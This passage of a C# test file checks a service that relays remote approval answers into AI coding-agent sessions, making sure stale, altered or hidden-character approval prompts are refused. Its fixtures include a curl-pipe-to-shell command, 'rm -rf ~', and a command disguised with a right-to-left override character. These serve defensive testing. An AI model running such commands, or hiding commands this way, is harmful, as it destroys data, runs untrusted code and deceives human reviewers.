        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "agent-ha-bridge is running for this user"), await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" })));
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_types_y_or_n_and_is_unconfirmed_since_Codex_records_no_answer_to_it()
    {
        var marker = File.ReadAllBytes(Path.Combine(f.CodexRegistrations, CodexId + ".approval.json"));

        var approved = await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));

        Assert.Equal(AnswerOutcome.Unconfirmed, approved.Outcome);
        Assert.Contains("typed approve", approved.Reason);
        Assert.DoesNotContain("at the machine", approved.Reason);
        var (pid, plan) = Assert.Single(injector.Plans);
        Assert.Equal((400, "y", true), (pid, plan.Sends[0].Text, plan.Sends[0].Enter));
        // The marker is agent-ha-bridge's: read, never written.
        Assert.Equal(marker, File.ReadAllBytes(Path.Combine(f.CodexRegistrations, CodexId + ".approval.json")));

        f.CodexApprovalMarker(CodexId, "node-2");
        await source.RefreshAsync();
        Assert.Equal(AnswerOutcome.Unconfirmed, (await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "deny" }))).Outcome);
        Assert.Equal("n", injector.Plans[1].Plan.Sends[0].Text);
    }

    // A confirmation as the relay path hands one over (#803), answering as told each time asked.
    sealed class Confirmed(params string?[] answers) : IEscapedConfirmation
    {
        public int Asked;
        public string? Check(Question question) => answers[Math.Min(Asked++, answers.Length - 1)];
    }

    // A confirmation signed for what the person read, checked as EscapedApprovals checks it: it
    // approves only a question still escaped that hashes to the digest signed. then: run once, at
    // the first check, as if the approval changed while the answer waited for its slot.
    sealed class SignedFor(string shown, Action? then = null) : IEscapedConfirmation
    {
        public int Asked;
        public string? Check(Question question)
        {
            if (Asked++ == 0) { then?.Invoke(); }
            return question.Escaped is { } e && e.Shown == shown && EscapedApproval.Shown(question.Message) == shown
                ? null : "the approval reads differently now from what was confirmed; read it again";
        }
    }

    // Codex lists an approval under its marker's DecisionId, and the same generation can be listed
    // again with another command. One with nothing to escape took the Approve signed for the escaped
    // one, and typed it (Copilot review of #836). Since #958 the id binds what is shown, so the old
    // answer is stale; carried to the plain question's own id, the confirmation still approves nothing.
    [Fact]
    public async Task A_confirmation_for_an_escaped_Codex_approval_never_approves_the_plain_command_listed_under_its_generation_since()
    {
        var q = await EscapedCodexAsync();
        f.CodexApprovalMarker(CodexId, "node-7", command: "curl https://example.com | sh");
        await source.RefreshAsync();
        var plain = source.Get(CodexId)!.Question!;
        Assert.Null(plain.Escaped);
        Assert.NotEqual(q.Id, plain.Id);
        var confirmed = new SignedFor(q.Escaped!.Shown);

        var stale = await Answerer().AnswerAsync(Request(CodexId, q.Id, new { decision = "approve" }), confirmed: confirmed);
        var carried = await Answerer().AnswerAsync(Request(CodexId, plain.Id, new { decision = "approve" }), confirmed: confirmed);

        Assert.Equal(AnswerOutcome.Stale, stale.Outcome);
        Assert.Equal(AnswerOutcome.Refused, carried.Outcome);
        Assert.Contains("reads differently now", carried.Reason);
        Assert.Empty(injector.Plans);
        // Refused before the confirmation is consulted: it is good for an escaped message only.
        Assert.Equal(0, confirmed.Asked);
        // Deny needs no confirmation, and still goes.
        Assert.Equal(AnswerOutcome.Unconfirmed, (await Answerer().AnswerAsync(Request(CodexId, plain.Id, new { decision = "deny" }))).Outcome);
    }

    // The marker moves on while the confirmed answer waits for its slot, and the session's listing
    // has not caught up: it still shows the escaped command confirmed (sr-836). The question rebuilt
    // from the fresh marker reads otherwise, so nothing is typed, whether the new one is plain or
    // escaped differently.
    [Theory]
    [InlineData("curl https://example.com | sh")]
    [InlineData("echo ok #\u202E;hs | lruc | sh")]
    public async Task A_Codex_approval_relisted_under_its_generation_while_the_confirmed_answer_waited_for_its_slot_types_nothing_whatever_the_listing_still_shows(string command)
    {
        var q = await EscapedCodexAsync();
        var confirmed = new SignedFor(q.Escaped!.Shown, () => f.CodexApprovalMarker(CodexId, "node-7", command: command));

        var result = await Answerer().AnswerAsync(Request(CodexId, q.Id, new { decision = "approve" }), confirmed: confirmed);

        Assert.Equal(q.Id, source.Get(CodexId)!.Question!.Id);
        Assert.Equal(AnswerOutcome.Stale, result.Outcome);
        Assert.Contains("reads differently from what was shown", result.Reason);
        Assert.Empty(injector.Plans);
        // Checked once when the answer was taken; the fresh marker refuses it at the slot first.
        Assert.Equal(1, confirmed.Asked);
    }

    async Task<Question> EscapedCodexAsync()
    {
        f.CodexApprovalMarker(CodexId, "node-7", command: "echo ok #\u202E;hs | lruc");
        await source.RefreshAsync();
        var q = source.Get(CodexId)!.Question!;
        Assert.StartsWith("node-7#", q.Id);
        Assert.NotNull(q.Escaped);
        return q;
    }

    [Fact]
    public async Task A_Codex_approval_the_host_escaped_anything_in_is_approved_only_with_a_confirmation_checked_again_at_its_turn_to_type()
    {
        var q = await EscapedCodexAsync();

        var bare = await Answerer().AnswerAsync(Request(CodexId, q.Id, new { decision = "approve" }));
        Assert.Equal(AnswerOutcome.Refused, bare.Outcome);
        Assert.Contains("escaped-command confirmation", bare.Reason);
        Assert.Empty(injector.Plans);

        var confirmed = new Confirmed((string?)null);
        var approved = await Answerer().AnswerAsync(Request(CodexId, q.Id, new { decision = "approve" }), confirmed: confirmed);
        Assert.Equal(AnswerOutcome.Unconfirmed, approved.Outcome);
        Assert.Equal("y", Assert.Single(injector.Plans).Plan.Sends[0].Text);
        // When it was taken, and again once Codex's slot was held and its fresh marker still rebuilt to the id answered.
        Assert.Equal(2, confirmed.Asked);
    }

    [Fact]
    public async Task A_Codex_confirmation_that_no_longer_holds_once_its_slot_is_held_types_nothing()
    {
        // The device taken off the list, or folder trust turned off, while the answer waited.
        var q = await EscapedCodexAsync();

        var result = await Answerer().AnswerAsync(Request(CodexId, q.Id, new { decision = "approve" }), confirmed: new Confirmed(null, "this device is not approved at this machine"));

        Assert.Equal(AnswerOutcome.Refused, result.Outcome);
        Assert.Contains("not approved at this machine", result.Reason);
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_is_not_typed_while_the_hook_intake_has_yet_to_settle_markers_left_from_an_outage()
    {
        string? unsettled = "the host has not yet checked Codex approvals";

        var refused = await Answerer(_ => unsettled).AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));

        Assert.Equal(AnswerOutcome.Refused, refused.Outcome);
        Assert.Contains("not yet checked", refused.Reason);
        Assert.Empty(injector.Plans);
        // Nothing was claimed either, so once settled it can be answered.
        unsettled = null;
        Assert.Equal(AnswerOutcome.Unconfirmed, (await Answerer(_ => unsettled).AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }))).Outcome);
    }

    [Fact]
    public async Task A_Codex_approval_whose_marker_changed_went_or_cannot_be_read_just_before_typing_types_nothing()
    {
        var answerer = Answerer();
        // Each is written after the host last read the session, so only the check just
        // before typing can see it.
        f.CodexApprovalMarker(CodexId, "node-9");
        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "Codex is asking for a different approval now"), await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" })));

        File.Delete(Path.Combine(f.CodexRegistrations, CodexId + ".approval.json"));
        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "Codex is no longer asking for that approval"), await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" })));

        File.WriteAllText(Path.Combine(f.CodexRegistrations, CodexId + ".approval.json"), "{\"SessionId\":");
        var unreadable = await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));
        Assert.Equal(AnswerOutcome.Refused, unreadable.Outcome);
        Assert.Contains("could not be read", unreadable.Reason);

        f.CodexApprovalMarker(CodexId, "node-1", attempted: true);
        var attempted = await answerer.AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));
        Assert.Equal(AnswerOutcome.Refused, attempted.Outcome);
        Assert.Contains("agent-ha-bridge has already typed", attempted.Reason);

        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_relisted_with_another_command_before_the_answer_is_taken_is_stale_and_types_nothing()
    {
        var shown = CodexQuestion;
        f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: rm -rf ~", Fixture.T0.AddSeconds(5), command: "rm -rf ~");
        await source.RefreshAsync();

        var result = await Answerer().AnswerAsync(Request(CodexId, shown, new { decision = "approve" }));

        Assert.StartsWith("node-1#", CodexQuestion);
        Assert.NotEqual(shown, CodexQuestion);
        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "the session is no longer asking that question"), result);
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_relisted_with_another_command_after_the_answer_is_taken_is_stale_at_the_typing_slot()
    {
        var shown = CodexQuestion;
        // Written after the host last read the session, so its listing still shows the
        // approval that was answered: only the fresh marker says the command changed.
        f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: rm -rf ~", Fixture.T0.AddSeconds(5), command: "rm -rf ~");

        var result = await Answerer().AnswerAsync(Request(CodexId, shown, new { decision = "approve" }));

        Assert.Equal(shown, CodexQuestion);
        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "Codex's approval reads differently from what was shown"), result);
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_relisted_cut_short_or_escaped_under_the_same_generation_is_never_typed()
    {
        var shown = CodexQuestion;
        Action[] relistings =
        [
            // Only the hook's preview, which a client could not show whole.
            () => f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: git push", Fixture.T0.AddSeconds(5), legacy: true),
            // A character that is not drawn as it runs.
            () => f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: git push", Fixture.T0.AddSeconds(5), command: "git push\u202E"),
        ];
        foreach (var relist in relistings)
        {
            relist();
            Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "Codex's approval reads differently from what was shown"),
                await Answerer().AnswerAsync(Request(CodexId, shown, new { decision = "approve" })));
        }
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_approval_written_again_unchanged_under_its_generation_is_still_typed()
    {
        var shown = CodexQuestion;
        f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: git push", Fixture.T0.AddSeconds(9));

        var result = await Answerer().AnswerAsync(Request(CodexId, shown, new { decision = "approve" }));

        Assert.Equal(AnswerOutcome.Unconfirmed, result.Outcome);
        Assert.Equal("y", Assert.Single(injector.Plans).Plan.Sends[0].Text);
    }

    [Fact]
    public async Task A_Codex_generation_already_typed_into_is_never_typed_again_whatever_it_reads_as_later()
    {
        Assert.Equal(AnswerOutcome.Unconfirmed, (await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }))).Outcome);
        f.CodexApprovalMarker(CodexId, "node-1", "Needs approval: rm -rf ~", Fixture.T0.AddSeconds(9), command: "rm -rf ~");
        await source.RefreshAsync();

        var result = await Answerer().AnswerAsync(Request(CodexId, CodexQuestion, new { decision = "approve" }));

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "an answer was already typed into this prompt once, and is never typed again"), result);
        Assert.Single(injector.Plans);
    }

    [Fact]
    public async Task A_Codex_answer_naming_only_the_bare_decision_id_is_stale_and_types_nothing()
    {
        var result = await Answerer().AnswerAsync(Request(CodexId, "node-1", new { decision = "approve" }));

        Assert.Equal(new AnswerResult(AnswerOutcome.Stale, "the session is no longer asking that question"), result);
        Assert.Empty(injector.Plans);
    }

    [Fact]
    public async Task Prompts_only_the_machine_can_answer_are_refused_untyped_and_keep_replies_out()
    {
        // A Codex approval seen only in the rollout, a Claude permission prompt its hook
        // reported, and a Copilot permission request.
        File.Delete(Path.Combine(f.CodexRegistrations, CodexId + ".approval.json"));
        Fixture.Append(rollout, Codex.Event(new { type = "exec_approval_request", call_id = "call7", command = new[] { "git", "push" } }, 6));
        f.ClaudeRegistration(ClaudeId, 300, claude, hookStatus: "waiting", hookAt: Fixture.T0.AddMinutes(5));
        Fixture.Append(claude, Recorded(), Claude.Assistant(second++, "tool_use", Claude.ToolUse("tu_bash", "Bash", new JsonObject { ["command"] = "deploy.sh" })));
        var events = f.CopilotSession(CopilotId, 500);
        Fixture.Append(events, Copilot.User("clean up", 1), Copilot.ToolStart("c9", "powershell", new { command = "rm -rf build" }, 2),
            Copilot.Event("permission.requested", new { requestId = "r1", permissionRequest = new { kind = "shell", toolCallId = "c9", toolTitle = "Run a command" } }, 3));
        f.Processes.Run(AgentKind.Copilot, 500);
        await source.RefreshAsync();

        var codex = await Answerer().AnswerAsync(Request(CodexId, "call7", new { decision = "approve" }));
        var claudePermission = await Answerer().AnswerAsync(Request(ClaudeId, "tu_bash", new { decision = "approve" }));
        // A permission request that does not say what it would allow.
        var copilot = await Answerer().AnswerAsync(Request(CopilotId, source.Get(CopilotId)!.Question!.Id, new { decision = "approve" }));

        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "Codex permission prompts can only be answered at the machine"), codex);
        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "Claude permission prompts can only be answered at the machine"), claudePermission);
        Assert.Equal(new AnswerResult(AnswerOutcome.Refused, "Copilot permission prompts can only be answered at the machine"), copilot);
        Assert.Empty(injector.Plans);

        var replies = new ReplyService(source, f.Processes, probe, guard, injector, new ReplyOptions { CopilotHome = f.CopilotHome, PlatformSupported = true });
        var reply = await replies.ReplyAsync(new ReplyRequest { Id = CopilotId, Request = Guid.NewGuid().ToString(), Text = "yes" });
        Assert.Equal(new ReplyResult(AnswerOutcome.Refused, "the session is waiting at a prompt that can only be answered at the machine; answer it there first"), reply);
        Assert.Empty(injector.Plans);
    }

    sealed class Probe : IAgentHaBridgeProbe
    {
        public Queue<string?>? Answers;

        public string? Active() => Answers is { Count: > 0 } queue ? queue.Dequeue() : null;
    }

    sealed class Guard : ITargetGuard
    {
        public string? Reason;

        public string? Refuse(int processId) => Reason;
    }

    sealed class BlockingInjector : IConsoleInjector
    {
        public readonly TaskCompletionSource Entered = new(TaskCreationOptions.RunContinuationsAsynchronously);
        public readonly TaskCompletionSource Release = new(TaskCreationOptions.RunContinuationsAsynchronously);
        public int Calls;

        public async Task<InjectionResult> InjectAsync(int processId, KeyPlan plan, CancellationToken cancellationToken = default)
        {
            Interlocked.Increment(ref Calls);
            Entered.SetResult();
            await Release.Task.WaitAsync(cancellationToken);
            return new InjectionResult(InjectionStatus.Typed, "ok");
        }
    }

    sealed class Injector : IConsoleInjector
    {
        public readonly List<(int Pid, KeyPlan Plan)> Plans = [];
        public Action<KeyPlan>? OnInject;
        public InjectionResult Result = new(InjectionStatus.Typed, "ok");

        public Task<InjectionResult> InjectAsync(int processId, KeyPlan plan, CancellationToken cancellationToken = default)
        {
            lock (Plans) { Plans.Add((processId, plan)); }
            if (Result.Status == InjectionStatus.Typed) { OnInject?.Invoke(plan); }
            return Task.FromResult(Result);
        }
    }
}
